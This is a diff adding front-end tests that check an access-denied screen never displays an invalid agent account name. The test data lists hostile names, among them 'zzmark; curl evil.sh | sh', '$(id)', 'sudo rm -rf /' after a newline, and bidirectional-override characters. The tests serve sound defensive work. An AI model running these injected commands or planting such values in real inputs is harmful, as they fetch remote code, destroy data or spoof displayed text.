@@ -280,6 +280,83 @@ describe("aide propre à la distribution (BR-ENGINE-005, 007, 017)", () => {
     wrapper.unmount();
   });
 
+  // HRT-74 S7 : le nom annoncé par l'agent, s'il n'est pas un nom de compte valide, n'est affiché NULLE PART
+  // (phrase, bloc à recopier, titre, info-bulle, nom accessible) : la phrase devient neutre.
+  const HOSTILE_NAMES = [
+    "zzmark; curl evil.sh | sh",
+    "zzmark user",
+    "zzmark$(id)",
+    "`zzmark`",
+    "zzmark\nsudo rm -rf /",
+    "zzmark\r\n",
+    "zzmark\u202Egnp.exe",
+    "\u2067zzmark\u2069",
+    "zzmark\u200Bx",
+    "Zzmark",
+    "-zzmark",
+    "zz".repeat(17),
+    `zzmark${"x".repeat(5000)}`,
+    "<b>zzmark</b>",
+  ];
+
+  for (const [label, isAdmin] of [
+    ["agent non administrateur", false],
+    ["agent administrateur du serveur", true],
+  ] as const) {
+    it(`accès refusé, ${label}, nom hostile : jamais affiché, la phrase est neutre`, async () => {
+      for (const hostile of HOSTILE_NAMES) {
+        const { wrapper } = await open((bridge) =>
+          bridge.services.seed("forge", [], {
+            state: "access_denied",
+            agentAccount: hostile,
+            agentIsAdmin: isAdmin,
+          }),
+        );
+        const html = wrapper.html();
+        const shown = JSON.stringify(hostile.slice(0, 30));
+        expect(html, shown).not.toContain("zzmark");
+        expect(html, shown).not.toContain("zzzzzzzzzzzzzzzzzz");
+        expect(html, shown).not.toContain("evil");
+        expect(html, shown).not.toMatch(/[\u202A-\u202E\u2066-\u2069\u200B]/);
+        expect(wrapper.text(), shown).not.toContain("zzmark");
+        // Phrase neutre : elle ne cite aucun compte et ne ressemble pas à un nom entre guillemets.
+        const sentence = wrapper.get("[data-engine-state] .engine__body p").text();
+        expect(sentence, shown).toContain("L'agent tourne sous un compte");
+        expect(sentence, shown).not.toContain("«");
+        expect(wrapper.find("code").exists() && wrapper.findAll("code").length, shown).toBeFalsy();
+        wrapper.unmount();
+      }
+    });
+  }
+
+  it("accès refusé, compte court (« pi ») : son nom reste dans la phrase et dans la commande usermod", async () => {
+    const { wrapper } = await open((bridge) =>
+      bridge.services.seed("forge", [], {
+        state: "access_denied",
+        agentAccount: "pi",
+        agentIsAdmin: false,
+      }),
+    );
+    expect(wrapper.get(".engine__body p code").text()).toBe("pi");
+    expect(wrapper.get("pre").text()).toBe("sudo usermod -aG docker pi");
+    wrapper.unmount();
+  });
+
+  it("accès refusé, nom de compte valide : cité dans la phrase, en chasse fixe", async () => {
+    const { wrapper } = await open((bridge) =>
+      bridge.services.seed("forge", [], {
+        state: "access_denied",
+        agentAccount: "hearth",
+        agentIsAdmin: false,
+      }),
+    );
+    expect(wrapper.get(".engine__body p code").text()).toBe("hearth");
+    expect(wrapper.get(".engine__body p").text()).toContain(
+      "L'agent tourne sous le compte « hearth »",
+    );
+    wrapper.unmount();
+  });
+
   it("accès refusé, nom de compte valide : repris dans la commande, sans note", async () => {
     const { wrapper } = await open((bridge) =>
       bridge.services.seed("forge", [], {
